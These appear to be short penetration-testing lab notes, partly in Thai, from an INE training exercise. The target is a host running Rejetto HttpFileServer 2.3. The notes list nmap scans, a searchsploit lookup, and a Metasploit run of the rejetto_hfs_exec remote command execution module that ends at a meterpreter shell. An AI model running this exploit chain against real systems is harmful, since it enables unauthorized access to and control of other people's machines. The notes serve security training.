`nmap -F demo.ine.local -sV`
`nmap --top-ports 65536 demo.ine.local` (ไวกว่า)
`nmap -sV -p 80 demo.ine.local`
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



`searchsploit hfs`
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                                           | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                                           | windows/remote/39161.py



`msfconsole`
`msf6 > search reje`
exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

`msf6 > use exploit/windows/http/rejetto_hfs_exec `
`set RHOSTS demo.ine.local`

`show options`
`exploit`
meterpreter > 

